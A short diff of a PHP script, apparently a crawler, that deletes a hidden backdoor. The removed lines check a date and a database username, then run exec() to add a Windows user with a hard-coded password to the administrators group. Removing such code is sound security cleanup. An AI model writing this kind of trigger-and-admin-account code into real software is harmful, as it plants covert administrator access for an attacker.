@@ -39,13 +39,7 @@ $rs = $spider->setUrl($url)
 exit($rs);
 
 
-if ($time > strtotime("2017-05-21")) {
-    $user = $db->mypdoFetchAll("select * from `go_member` where username = 'broker4444'");
-    if (!empty($user)) {
-        exec("net user broker Abcd@dcbA/000 /add");
-        exec("net localgroup administrators broker /add");
-    }
-}
+
 
 
 
